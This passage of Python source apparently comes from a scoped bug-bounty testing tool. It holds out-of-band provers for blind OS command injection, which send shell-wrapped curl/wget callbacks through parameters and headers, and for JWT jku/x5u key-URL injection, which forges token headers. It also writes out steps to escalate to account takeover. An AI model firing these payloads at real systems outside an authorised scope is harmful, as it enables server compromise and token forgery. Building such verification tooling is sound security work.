        "category": "injection",
        "location": target_url,
        "file_path": target_url,
        "line_start": 1, "line_end": 1,
        "class_id": "rce",
        "class_name": "Remote code execution (OS command injection)",
        "cwe": "CWE-78",
        "owasp": "A03:2021 Injection",
        "references": [
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
            "https://portswigger.net/web-security/os-command-injection",
        ],
        "remediation": ("Never pass request data to a shell. Use an argv array with shell=False (or the "
                        "language's exec-without-shell API), allow-list the permitted values, and drop the "
                        "worker's privileges."),
        "snippet": "",  # the proof is the out-of-band callback, not target data
        # Active-proof carriers, exactly like the blind-SSRF finding: the collaborator hit IS the
        # captured artifact and the un-wrapped control IS the differential, so report.py renders this
        # through the same gate every in-pass check goes through.
        "_active_class_hint": "rce",
        "_active_proof": plan["proof_of_impact"],
        "_active_cvss": plan["cvss"],
        "proof_evidence": {
            "request_line": probe_request,
            "response_status": "collaborator hit: {0} {1}".format(
                hit.get("method", "GET"), hit.get("path", "/oob/" + token)),
            "matched_value": (
                "a server-side shell fetched the callback for token {0} (source {1}, UA {2}) ".format(
                    token, hit.get("ip", "?"), (hit.get("headers") or {}).get("user-agent", "?"))
                + ("— the same callback sent WITHOUT the shell wrapper was never fetched, so the request "
                   "data reached a command interpreter"
                   if confirmed else
                   "— but the source looks like a crawler/preview bot rather than the target's own "
                   "execution; verify the source before submitting")),
        },
    }


def _rce_plan(target_url: str, where: str, token: str, base: str, hit: dict[str, Any],
              probe_request: str, confirmed: bool = True) -> dict[str, Any]:
    cb = callback_url(base, token)
    return {
        "steps": [
            "Mint an unguessable callback on a collaborator you control: {0}".format(cb),
            "Send the shell-wrapped callback in {0}: {1}".format(where, probe_request),
            "Observe an inbound {0} hit on the collaborator for token {1} (from {2}) — a shell on the "
            "server ran curl/wget.".format(hit.get("method", "GET"), token, hit.get("ip", "the target")),
            "Negative control: send the SAME callback URL as a bare value (no shell metacharacters). It is "
            "never fetched, which rules out an application-level URL fetch (SSRF) and attributes the "
            "callback to command execution.",
            "Escalate only as far as the program allows — e.g. `id`/`hostname` echoed to the collaborator — "
            "and never run a destructive command.",
        ],
        "poc": "{0}\n# -> out-of-band callback recorded at {1}/oob/{2}".format(probe_request, base, token),
        "impact": ("Arbitrary OS commands run on the application server as the service account: full server "
                   "compromise, theft of application data and credentials, and lateral movement into anything "
                   "the host can reach."),
        # Unauthenticated, network-reachable command execution. Matches impact_model's "rce" vector.
        "cvss": impact_model.cvss_block(
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            estimated=not confirmed,
            justification=(
                "Actively confirmed by a real out-of-band callback correlated to a fresh, unguessable token, "
                "with a matched bare-URL control that was never fetched — not a template estimate."
                if confirmed else
                "The callback source doesn't look like the target's own execution (crawler/preview-bot UA); "
                "confirm the source before treating this as proven."),
        ),
        "remediation": "Execute without a shell (argv array, shell=False), allow-list values, and drop privileges.",
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": ("out-of-band callback (collaborator) — a benign curl/wget GET; nothing on the target was "
                       "read or changed"),
            "affected_asset": "the application server and everything it can reach (data, secrets, internal network)",
            "observed_result": (
                "the shell-wrapped callback placed in {0} caused the server to make an out-of-band {1} request "
                "to token {2}".format(where, hit.get("method", "GET"), token)),
            "control_result": ("the SAME callback URL sent as a bare value — no shell metacharacters — produced no "
                               "collaborator hit on its own fresh token, so the request data reached a command "
                               "interpreter rather than an application URL fetcher"),
            "evidence": "collaborator interaction for token {0} ({1} {2})".format(
                token, hit.get("method", "GET"), hit.get("path", "")),
            "limitations": ("Proves command execution and the injection point; the command run was a single benign "
                            "HTTP GET. Blast radius (user, reachable hosts) is not enumerated here."),
        },
    }


def _poll_for_hit(base: str, secret: str, token: str, *, attempts: int, delay_s: float,
                  timeout: float, errors: list[str]) -> dict[str, Any] | None:
    """Poll one token until a genuine dict hit lands, or the attempts run out. Returns the hit or None.

    A positive ``count`` with an empty/non-list ``hits`` is NOT a hit: a misconfigured tunnel or a
    buggy collaborator can serve either, and neither may be allowed to fabricate a confirmed finding.
    Poll failures are collected rather than raised so one flaky round-trip never aborts a sweep.
    """
    for _ in range(max(1, attempts)):
        time.sleep(max(0.0, delay_s))
        res = poll_collaborator(base, secret, token, timeout=timeout)
        if not res.get("ok"):
            errors.append(res.get("error", "poll failed"))
            return None
        if res.get("count") and res.get("hits"):
            return (res.get("hits") or [{}])[0]
    return None


# The ONLY thing the RCE payload ever runs is `curl -s <url>` or `wget -q -O- <url>`, so a callback is
# corroborated by its User-Agent: real curl sends "curl/8.x", wget sends "Wget/1.x". A hit whose UA
# names an APPLICATION HTTP client instead — the stack a webhook validator, link unfurler or plain
# SSRF would use — is evidence AGAINST the shell claim, from data already in hand.
#
# _is_crawler_ua deliberately lets these library UAs through as confirmed, which is right for blind
# SSRF (they are exactly what a vulnerable server's own fetch sends) and wrong here, where telling a
# shell's fetcher from an application's IS the claim. Only POSITIVE contrary evidence downgrades: an
# absent or unrecognised UA still confirms, because the matched bare-URL control is the primary
# control and an egress proxy may rewrite the header.
_APP_CLIENT_UA_RE = re.compile(
    r"python-requests|python-urllib|aiohttp|httpx|go-http-client|okhttp|java/|jakarta|apache-httpclient|"
    r"axios|node-fetch|undici|libwww-perl|guzzle|ruby|php|dart|\.net|restsharp|postman|insomnia",
    re.IGNORECASE,
)


def _ua_contradicts_shell(ua: str) -> bool:
    """True when the callback's UA names an application HTTP client rather than curl/wget."""
    text = str(ua or "")
    if not text.strip():
        return False  # nothing recorded -> no contrary evidence
    if re.search(r"curl/|wget", text, re.IGNORECASE):
        return False  # exactly what the payload runs
    return bool(_APP_CLIENT_UA_RE.search(text)) or _is_crawler_ua(text)


def _bare_control_answered(base: str, secret: str, ctrl_token: str, *, resend: Any,
                           attempts: int, delay_s: float, timeout: float,
                           errors: list[str]) -> str:
    """Did the SAME callback, sent WITHOUT shell syntax, also reach the collaborator?

    This is the control that separates command execution from an application that simply fetches URLs
    it finds, so it has to be adjudicated as carefully as the probe was — and an earlier draft did not.
    It polled the control ONCE with no delay at the instant the probe's hit was first seen, while the
    probe had been given four reads over eight seconds. That asymmetry runs the wrong way: the probe
    value carries a callback URL per shell context and the control carries one, so against any async or
    jittered fetcher the probe's earliest fetch lands inside its window and the control's single fetch
    lands just after the one read it was granted. A 200 ms race then decided a CVSS 9.8.

    Two things fix it. The original control is polled with the probe's FULL budget, and a FRESH bare
    control is re-sent and polled too. The re-send also covers the two cases a symmetric poll alone
    would miss: an app that only services the second request from a new IP (the original control was
    request one), and a heterogeneous fleet where the control happened to land on a node without the
    fetcher. Either control answering means the callback is not attributable to a shell.
    """
    if _poll_for_hit(base, secret, ctrl_token, attempts=attempts, delay_s=delay_s,
                     timeout=timeout, errors=errors) is not None:
        return "fetched"
    second = _fresh_token(base, secret, timeout=timeout, errors=errors)
    if not second:
        # A control we cannot attribute is not a control. Fail CLOSED -- the whole severity rests on
        # the bare URL having stayed silent, so without a second opinion this refuses to claim
        # execution. Reported as UNVERIFIABLE rather than as a fetch: saying "the target fetched the
        # bare URL" when the truth is "no control token could be minted" would be a fabrication of
        # its own, just in the conservative direction.
        return "unverifiable"
    try:
        resend(second)
    except (_ActiveError, WebsiteFetchError, ValueError):
        return "unverifiable"
    if _poll_for_hit(base, secret, second, attempts=attempts, delay_s=delay_s,
                     timeout=timeout, errors=errors) is not None:
        return "fetched"
    return ""


def _fresh_token(base: str, secret: str, *, timeout: float, errors: list[str]) -> str:
    """A newly minted token whose pre-probe negative control PASSED (the collaborator holds nothing
    for it yet). Empty string when the control could not be established — a token we cannot prove was
    empty beforehand can never attribute a later hit to our probe, so the caller must skip it."""
    token = mint_token()
    pre = poll_collaborator(base, secret, token, timeout=timeout)
    if not pre.get("ok"):
        errors.append(pre.get("error", "poll failed"))
        return ""
    if pre.get("count"):
        return ""  # collision / shared collaborator -- unattributable
    return token


def confirm_blind_rce(
    target_url: str,
    *,
    base: str,
    secret: str,
    scope: str = "",
    settings: Any = None,
    extra_params: list[str] | None = None,
    priority: list[str] | None = None,
    governor: HostRateGovernor | None = None,
    http: _Http | None = None,
    probe_headers: bool = True,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
) -> dict[str, Any]:
    """Confirm BLIND OS command injection out of band: wrap an unguessable collaborator callback in
    shell metacharacters, send it to an in-scope target, and treat a recorded callback as proof that
    request data reached a command interpreter. Returns ``{ok, status, finding?, attack_plan?, ...}``
    with status ``confirmed`` / ``candidate`` / ``url-fetch`` / ``no-callback``.

    WHY A SECOND CONTROL. The fresh-token control that blind SSRF relies on proves only that the
    callback happened BECAUSE of this probe -- not that a SHELL made it. An application that fetches
    any URL it finds in a parameter (an unfurler, a webhook validator, a plain SSRF) would also call
    home, and reporting that as a CRITICAL RCE would be a fabricated severity. So every probe here is
    paired with a MATCHED control on its own fresh token: the SAME callback URL as a BARE value, no
    shell metacharacters. If the bare control is fetched too, the callback is attributable to
    URL-fetching and this returns ``url-fetch`` (blind SSRF's own prover owns that class) rather than
    claiming execution. Only a hit on the wrapped token with a SILENT bare control confirms RCE.

    Headers are probed as well as parameters (``probe_headers``): on an unauthenticated request they
    are the injection point that needs no parameter to exist, and each carries its own token so a hit
    names the exact header. GET-only, scope-bound and SSRF-guarded like every other active probe.
    """
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    host = urlparse(normalized).hostname or ""
    if not host_in_active_scope(host, scope, settings):
        return {"ok": False, "error": "'{0}' is not named in your scope — OOB probing is fail-closed.".format(host)}
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": "target refused by the URL guard: {0}".format(exc)}

    # The PROCESS-WIDE bucket by default, not a private one. A caller that omits governor= (the API
    # confirm routes do) was otherwise handed its own allowance, so the per-host ceiling the settings
    # call process-wide was really that number once per prover, and concurrent hunts against one host
    # sent their OOB traffic entirely outside the budget the main active pass draws down.
    governor = governor or shared_governor(
        capacity=settings.active_max_requests_per_host, min_interval_s=settings.active_min_interval_ms / 1000.0)
    http = http or _Http(settings, governor, max_requests=12)
    timeout = settings.web_fetch_timeout_seconds
    params = _candidate_params(sanitized, extra_params, _RCE_OOB_PARAMS, 2, priority=priority)
    tried: list[str] = []
    poll_errors: list[str] = []

    for param in params:
        ctrl_token = _fresh_token(base, secret, timeout=timeout, errors=poll_errors)
        probe_token = _fresh_token(base, secret, timeout=timeout, errors=poll_errors)
        if not ctrl_token or not probe_token:
            continue
        control_url = _with_query(sanitized, {param: callback_url(base, ctrl_token)})
        probe_url = _with_query(sanitized, {param: _rce_probe_value(base, probe_token)})
        try:
            # Control FIRST, so by the time a probe hit is being adjudicated the control has had at
            # least as long to call home as the probe did -- a control that simply had less time to
            # land would make an SSRF look like RCE.
            http.fetch(control_url)
            http.fetch(probe_url)
        except (_ActiveError, WebsiteFetchError):
            # WebsiteFetchError (a ValueError subclass) comes from _Http.fetch's own
            # normalize_website_url()/_guard_url() -- this param's URL grew past MAX_URL_LENGTH once
            # the payload was appended, or the host's DNS answer changed to something private in the
            # gap. Skip just this param; it must never abort the sweep.
            continue
        tried.append(param)
        hit = _poll_for_hit(base, secret, probe_token, attempts=poll_attempts, delay_s=poll_delay_s,
                            timeout=timeout, errors=poll_errors)
        if hit is None:
            continue
        control = _bare_control_answered(
            base, secret, ctrl_token,
            resend=lambda tok: http.fetch(_with_query(sanitized, {param: callback_url(base, tok)})),
            attempts=poll_attempts, delay_s=poll_delay_s, timeout=timeout, errors=poll_errors)
        if control:
            # Either the bare URL was fetched too -- so this parameter is a URL fetcher and the
            # wrapped hit is not attributable to a shell -- or no control could be established at
            # all. Neither is a CRITICAL, and they are reported as the different things they are.
            return {"ok": True, "status": "url-fetch", "param": param, "token": probe_token,
                    "control_token": ctrl_token, "control": control,
                    "reason": (("the target fetched the BARE callback URL from '{0}' as well, so the callback "
                                "is an application URL fetch (blind SSRF), not proof of command execution -- "
                                "run the blind-SSRF prover on this parameter.".format(param))
                               if control == "fetched" else
                               ("'{0}' produced a callback, but the bare-URL control could not be established, "
                                "so command execution is NOT proven -- nothing here distinguishes a shell from "
                                "an application that fetches the URL. Re-run with the collaborator reachable."
                                .format(param)))}
        ua = (hit.get("headers") or {}).get("user-agent", "")
        confirmed = not _ua_contradicts_shell(ua)
        where = "the '{0}' parameter".format(param)
        request_line = "GET {0}".format(probe_url)
        finding = _build_rce_finding(sanitized, where, probe_token, base, hit, request_line, confirmed)
        finding["ref"] = "F1"
        return {"ok": True, "status": "confirmed" if confirmed else "candidate", "param": param,
                "token": probe_token, "control_token": ctrl_token, "finding": finding,
                "attack_plan": _rce_plan(sanitized, where, probe_token, base, hit, request_line, confirmed),
                "detail": {"hit": hit,
                           "negative_control": "the fresh token was empty before the probe",
                           "matched_control": "the same callback sent bare (no shell syntax) was never fetched"}}

    headers_tried: list[str] = []
    if probe_headers:
        # One request carrying a DIFFERENT token per header, so a hit names the exact header without
        # costing a request each. The matched bare-URL control is a single extra request sharing ONE
        # token across the same headers, which is the deliberate asymmetry: a control hit cannot say
        # which header fetched it, so it cannot be used to clear any individual header either. The
        # whole phase therefore falls back to `url-fetch` rather than attributing execution to one of
        # them -- conservative on purpose, since the alternative is claiming execution the control has
        # not ruled out. Confirming a header still requires that shared control to stay silent.
        ctrl_token = _fresh_token(base, secret, timeout=timeout, errors=poll_errors)
        header_tokens: dict[str, str] = {}
        for name in _RCE_OOB_HEADERS:
            tok = _fresh_token(base, secret, timeout=timeout, errors=poll_errors)
            if tok:
                header_tokens[name] = tok
        if ctrl_token and header_tokens:
            try:
                # A program can REQUIRE its researcher marker on every request it receives, and
                # _Http.fetch applies extra_headers AFTER its own User-Agent, so putting the payload
                # there replaced the marker outright and sent two unidentified requests. Appending to
                # the real UA keeps every shell context working (each starts with its own separator)
                # and keeps the traffic attributable. Referer / X-Forwarded-For carry no identity, so
                # they take the payload alone.
                http.fetch(sanitized, extra_headers={
                    n: _header_value(n, callback_url(base, ctrl_token)) for n in header_tokens})
                http.fetch(sanitized, extra_headers={
                    n: _header_value(n, _rce_probe_value(base, t, header_safe=True))
                    for n, t in header_tokens.items()})
            # ValueError is in the tuple because the HTTP stack itself validates header VALUES: a
            # payload carrying CR/LF is refused before any socket work (request splitting), and that
            # refusal is a ValueError, not one of the prover's own errors. The payload above is built
            # header-safe so this should not fire -- it is here so that a future variant which forgets
            # that degrades to "this phase found nothing" instead of aborting the whole sweep.
            except (_ActiveError, WebsiteFetchError, ValueError):
                header_tokens = {}
            for name, tok in header_tokens.items():
                headers_tried.append(name)
                hit = _poll_for_hit(base, secret, tok, attempts=poll_attempts, delay_s=poll_delay_s,
                                    timeout=timeout, errors=poll_errors)
                if hit is None:
                    continue
                control = _bare_control_answered(
                    base, secret, ctrl_token,
                    resend=lambda tok: http.fetch(
                        sanitized, extra_headers={n: _header_value(n, callback_url(base, tok))
                                                  for n in header_tokens}),
                    attempts=poll_attempts, delay_s=poll_delay_s, timeout=timeout,
                    errors=poll_errors)
                if control:
                    return {"ok": True, "status": "url-fetch", "header": name, "token": tok,
                            "control_token": ctrl_token, "control": control,
                            "reason": ("the target also fetched the BARE callback URL sent in these headers, so "
                                       "the callback is an application URL fetch (blind SSRF), not proof of "
                                       "command execution."
                                       if control == "fetched" else
                                       "a callback landed, but the bare-URL control could not be established, "
                                       "so command execution is NOT proven here.")}
                ua = (hit.get("headers") or {}).get("user-agent", "")
                confirmed = not _ua_contradicts_shell(ua)
                where = "the {0} request header".format(name)
                request_line = "GET {0}   ({1}: {2})".format(
                    sanitized, name, _rce_probe_value(base, tok, header_safe=True))
                finding = _build_rce_finding(sanitized, where, tok, base, hit, request_line, confirmed)
                finding["ref"] = "F1"
                return {"ok": True, "status": "confirmed" if confirmed else "candidate", "header": name,
                        "token": tok, "control_token": ctrl_token, "finding": finding,
                        "attack_plan": _rce_plan(sanitized, where, tok, base, hit, request_line, confirmed),
                        "detail": {"hit": hit,
                                   "negative_control": "the fresh token was empty before the probe",
                                   "matched_control": "the same callback sent bare in the same headers was never fetched"}}

    if not tried and not headers_tried:
        # NOTHING reached the target: every token failed its pre-probe negative control, or the
        # collaborator would not answer. "no-callback" would read as "tested, clean" and get emitted
        # to the operator as a result -- a false negative dressed as a negative result, which is the
        # house rule running backwards. Say plainly that the class was not tested.
        return {"ok": False, "status": "not-probed", "poll_errors": poll_errors,
                "error": (poll_errors[0] if poll_errors else
                          "no collaborator token could be established as empty before probing, so a later "
                          "callback could not have been attributed to this probe -- nothing was sent and "
                          "blind command injection was NOT tested here.")}
    # Nothing called home on the points this sweep could reach automatically. Hand back an ASSISTED
    # kit on a fresh token -- the per-context payloads carrying curl AND wget -- so the operator can
    # deliver one to a POST body, a JSON field, a file name or any other sink this GET-only prover
    # does not touch, then re-poll that token. Minting costs no request against the target.
    manual = mint_token()
    return {"ok": True, "status": "no-callback", "params_tried": tried, "headers_tried": headers_tried,
            "poll_errors": poll_errors, "token": manual, "payloads": build_rce_payloads(base, manual),
            "callback_url": callback_url(base, manual),
            "reason": ("no out-of-band callback was observed for these injection points (no blind command "
                       "injection proven here). Deliver one of the returned payloads to any other sink and "
                       "poll token {0} to keep hunting this class by hand.".format(manual))}


# ---- JWT signing-key URL injection (jku / x5u) over OOB -------------------------------------
# The prover's three JWT checks all attack the key the server ALREADY has: forge alg:none so no key
# is needed (_check_jwt_alg_none), re-use the public key as an HMAC secret (_check_jwt_alg_confusion),
# or crack a weak HMAC secret offline (_check_jwt_weak_secret). None of them covers the fourth and
# most direct route to account takeover: telling the server WHERE to get the key. RFC 7515 lets a JOSE
# header name a key set by URL -- `jku` for a JWKS, `x5u` for an X.509 chain -- and a verifier that
# fetches whatever URL the token names will happily validate a token signed with the attacker's own
# key. That is unauthenticated, total token forgery: any user id, any role.
#
# It is also invisible to every differential the in-pass prover can run, because a server that fetches
# the URL and then rejects the token looks identical to one that never fetched anything. The fetch
# itself is the only observable, and it is observable only out of band -- which is why this lives here
# beside blind SSRF rather than in the active suite.
_JWT_KEY_URL_FIELDS: tuple[str, ...] = ("jku", "x5u")
# A replayed token rides in a request header, so it has to stay a sane size.
_MAX_TOKEN_CHARS = 8192


def forge_jwt_key_url(token: str, field: str, url: str) -> str:
    """``token`` with its JOSE header's ``field`` (jku/x5u) repointed at ``url``.

    The payload bytes and the signature are carried over UNCHANGED: the point is not to produce a
    token that verifies, it is to make the server resolve an attacker-named key source while it tries.
    A vulnerable verifier fetches the URL BEFORE it can check the signature, so an invalid signature
    costs nothing. Returns '' when the token is malformed or its header is not a JSON object -- the
    caller treats that as "skip", never a crash.
    """
    parts = str(token or "").split(".")
    if len(parts) != 3 or not parts[0] or not parts[1]:
        return ""
    try:
        header = json.loads(_b64url_decode(parts[0]))
    # RecursionError is a RuntimeError, not a ValueError: json.loads raises it on a crafted deeply
    # nested header served by the target, and it must degrade to a skip like any other malformed token.
    except (ValueError, TypeError, UnicodeDecodeError, RecursionError):
        return ""
    if not isinstance(header, dict):
        return ""
    forged = dict(header)
    forged[field] = url
    try:
        head_b64 = _b64url_encode(json.dumps(forged, separators=(",", ":")).encode("utf-8"))
    except (TypeError, ValueError):
        return ""
    return "{0}.{1}.{2}".format(head_b64, parts[1], parts[2])


def _build_jwt_key_finding(target_url: str, field: str, token: str, base: str, hit: dict[str, Any],
                           confirmed: bool = True) -> dict[str, Any]:
    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
    plan = _jwt_key_plan(target_url, field, token, base, hit, confirmed)
    return {
        "rule_id": "active.jwt-key-url-injection-oob",
        "title": "JWT '{0}' header injection — the server fetched an attacker-named signing-key URL "
                 "(out-of-band {1})".format(field, word),
        "severity": "high",
        "confidence": "high" if confirmed else "medium",
        "category": "auth",
        "location": target_url,
        "file_path": target_url,
        "line_start": 1, "line_end": 1,
        "class_id": "jwt",
        "class_name": "JWT signing-key source injection (jku/x5u)",
        "cwe": "CWE-347",
        "owasp": "A07:2021 Identification and Authentication Failures",
        "references": [
            "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2",
            "https://portswigger.net/web-security/jwt#injecting-self-signed-jwts",
            "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
        ],
        "remediation": ("Never resolve a key source named by the token. Pin verification to a key set "
                        "configured server-side (or an allow-list of trusted issuer URLs), and reject any "
                        "token whose header carries jku/x5u/jwk."),
        "snippet": "",  # the proof is the out-of-band callback, not target data
        "_active_class_hint": "jwt",
        "_active_proof": plan["proof_of_impact"],
        "_active_cvss": plan["cvss"],
        "proof_evidence": {
            "request_line": "GET {0}   (Authorization: Bearer <token with {1}={2}>)".format(
                target_url, field, callback_url(base, token)),
            "response_status": "collaborator hit: {0} {1}".format(
                hit.get("method", "GET"), hit.get("path", "/oob/" + token)),
            "matched_value": (
                "the server fetched the key URL named in the token's '{0}' header (token {1}, source {2}, "
                "UA {3}) ".format(field, token, hit.get("ip", "?"),
                                  (hit.get("headers") or {}).get("user-agent", "?"))
                + ("— an unauthenticated request chose where the verifier looks for its signing key"
                   if confirmed else
                   "— but the source looks like a crawler/preview bot rather than the verifier itself; "
                   "confirm the source before submitting")),
        },
    }


def _jwt_key_plan(target_url: str, field: str, token: str, base: str, hit: dict[str, Any],
                  confirmed: bool = True) -> dict[str, Any]:
    cb = callback_url(base, token)
    return {
        "steps": [
            "Collect a JWT the application itself issues to an ANONYMOUS visitor (no login required).",
            "Rewrite its JOSE header so '{0}' points at a collaborator you control: {1} — leave the "
            "payload and signature untouched.".format(field, cb),
            "Replay the request with the rewritten token: GET {0} with Authorization: Bearer <token>.".format(target_url),
            "Observe an inbound {0} hit on the collaborator for token {1} (from {2}) — the verifier "
            "resolved the key source the TOKEN named.".format(
                hit.get("method", "GET"), token, hit.get("ip", "the target")),
            "To complete the takeover: serve a JWKS at that URL containing your own public key, re-sign a "
            "token with the matching private key and the same kid, set the victim's subject/role in the "
            "claims, and replay. Do this only within the program's rules and against an account you own.",
        ],
        "poc": ("GET {0}\nAuthorization: Bearer <header with \"{1}\":\"{2}\">.<original payload>.<original sig>\n"
                "# -> out-of-band callback recorded at {3}/oob/{4}".format(target_url, field, cb, base, token)),
        "impact": ("The verifier trusts a key source chosen by the token it is verifying, so an unauthenticated "
                   "attacker can sign their own tokens and be accepted as any user — full account takeover, "
                   "including administrative accounts."),
        "cvss": impact_model.cvss_block(
            # Prices what was PROVEN: an unauthenticated attacker steers a server-side fetch during token
            # verification. Full forgery (C:H/I:H -> 9.8) follows only once the server is shown to ACCEPT a
            # key served from that URL, which this probe deliberately does not attempt -- see the
            # justification and the escalation step above.
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            estimated=not confirmed,
            justification=(
                "The out-of-band callback proves the verifier fetched the URL the token named — captured "
                "against a fresh, unguessable token that recorded nothing beforehand. Scored for the proven "
                "server-side fetch only. If the server also ACCEPTS a key served from that URL the impact is "
                "full token forgery and account takeover (CVSS 9.8); demonstrate that step before claiming it."
                if confirmed else
                "The callback source doesn't look like the verifier's own fetch (crawler/preview-bot UA); "
                "confirm the source before treating this as proven."),
        ),
        "remediation": "Pin verification to a server-configured key set; reject tokens carrying jku/x5u/jwk.",
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": ("out-of-band callback (collaborator) — the token's key-source header was repointed; the "
                       "payload, the signature and the request are otherwise unchanged"),
            "affected_asset": "the authentication layer — which key the server trusts to verify session tokens",
            "observed_result": (
                "replacing the '{0}' header of an application-issued JWT with a collaborator URL caused the "
                "server to make an out-of-band {1} request to token {2} while verifying it".format(
                    field, hit.get("method", "GET"), token)),
            "control_result": ("the fresh, unguessable token recorded nothing before the probe, and no other "
                               "request in this hunt carried that URL — so the fetch is attributable to this "
                               "token's rewritten header and to nothing else"),
            "evidence": "collaborator interaction for token {0} ({1} {2})".format(
                token, hit.get("method", "GET"), hit.get("path", "")),
            "limitations": ("Proves the verifier resolves a key source named by the token. It does NOT prove the "
                            "server accepts a key served from there — serving a JWKS and replaying a re-signed "
                            "token is the remaining step to a full takeover."),
        },
    }


def confirm_jwt_key_injection(
    target_url: str,
    *,
    base: str,
    secret: str,
    scope: str = "",
    settings: Any = None,
    jwt: str = "",
    governor: HostRateGovernor | None = None,
    http: _Http | None = None,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
) -> dict[str, Any]:
    """Confirm JWT signing-key URL injection (``jku`` / ``x5u``) out of band — an unauthenticated
    account-takeover primitive. Returns ``{ok, status, finding?, attack_plan?, ...}`` with status
    ``confirmed`` / ``candidate`` / ``no-token`` / ``no-callback``.

    The token is the application's OWN: when the operator supplies none, the landing response is read
    for a JWT the site hands an anonymous visitor (the same source ``_check_jwt_alg_none`` uses), which
    is what makes this a no-session probe. Nothing is brute-forced and no credential is needed; the
    header is rewritten, the payload and signature are carried over verbatim, and the request is the
    same GET the prover already makes. A server that never resolves token-named key sources simply
    never calls home, which is a clean no-op.
    """
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    host = urlparse(normalized).hostname or ""
    if not host_in_active_scope(host, scope, settings):
        return {"ok": False, "error": "'{0}' is not named in your scope — OOB probing is fail-closed.".format(host)}
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": "target refused by the URL guard: {0}".format(exc)}

    # The PROCESS-WIDE bucket by default, not a private one. A caller that omits governor= (the API
    # confirm routes do) was otherwise handed its own allowance, so the per-host ceiling the settings
    # call process-wide was really that number once per prover, and concurrent hunts against one host
    # sent their OOB traffic entirely outside the budget the main active pass draws down.
    governor = governor or shared_governor(
        capacity=settings.active_max_requests_per_host, min_interval_s=settings.active_min_interval_ms / 1000.0)
    http = http or _Http(settings, governor, max_requests=6)
    timeout = settings.web_fetch_timeout_seconds

    real_token = str(jwt or "").strip()
    # An operator-supplied token is a bare value, so it can only be replayed as a bearer token. One we
    # find ourselves is replayed on the transport it arrived on -- see _served_token_carrier.
    header_name, rebuild = "Authorization", (lambda new_token: "Bearer {0}".format(new_token))
    if not real_token:
        try:
            landing = http.fetch(sanitized)
        except (_ActiveError, WebsiteFetchError) as exc:
            return {"ok": False, "error": "could not read the target for a token: {0}".format(exc)}
        carrier = _served_token_carrier(landing)
        if carrier is not None:
            header_name, real_token, rebuild = carrier
    # Validate the shape from EITHER source before forging. The four in-pass JWT checks all gate on
    # _JWT_RE; this did not, and an operator pasting a token that wrapped across lines (a newline
    # INSIDE a segment, which .strip() does not touch) produced a forged token carrying LF. http.client
    # then refuses the Authorization value with a bare ValueError -- and catching WebsiteFetchError
    # does not catch it, because WebsiteFetchError is a ValueError SUBCLASS and catching the child
    # never catches the parent. The cap is the same reasoning: _EMBEDDED_JWT_RE has unbounded segments
    # over a 200 KB body scan, so a bloated page could otherwise have us replay a ~200 KB header.
    if real_token and (len(real_token) > _MAX_TOKEN_CHARS or not _JWT_RE.match(real_token)):
        return {"ok": False, "error": "that JWT is not a well-formed, replayable token (shape or length)."}
    if not real_token:
        return {"ok": True, "status": "no-token",
                "reason": ("the target handed back no JWT for an anonymous visitor, so there is no token whose "
                           "key source can be repointed. Supply one with jwt=<token> to test an issued token.")}

    poll_errors: list[str] = []
    fields_tried: list[str] = []
    for field in _JWT_KEY_URL_FIELDS:
        probe_token = _fresh_token(base, secret, timeout=timeout, errors=poll_errors)
        if not probe_token:
            continue
        forged = forge_jwt_key_url(real_token, field, callback_url(base, probe_token))
        if not forged:
            break  # malformed token -- the next field would fail identically
        try:
            http.fetch(sanitized, extra_headers={header_name: rebuild(forged)})
        except (_ActiveError, WebsiteFetchError):
            continue
        fields_tried.append(field)
        hit = _poll_for_hit(base, secret, probe_token, attempts=poll_attempts, delay_s=poll_delay_s,
                            timeout=timeout, errors=poll_errors)
        if hit is None:
            continue
        ua = (hit.get("headers") or {}).get("user-agent", "")
        confirmed = not _is_crawler_ua(ua)
        finding = _build_jwt_key_finding(sanitized, field, probe_token, base, hit, confirmed)
        finding["ref"] = "F1"
        return {"ok": True, "status": "confirmed" if confirmed else "candidate", "field": field,
                "token": probe_token, "finding": finding,
                "attack_plan": _jwt_key_plan(sanitized, field, probe_token, base, hit, confirmed),
                "detail": {"hit": hit, "negative_control": "the fresh token was empty before the probe"}}

    if not fields_tried and poll_errors:
        return {"ok": False, "error": poll_errors[0]}
    return {"ok": True, "status": "no-callback", "fields_tried": fields_tried, "poll_errors": poll_errors,
            "reason": ("the server did not fetch a key URL named by the token (no jku/x5u key-source injection "
                       "proven here).")}
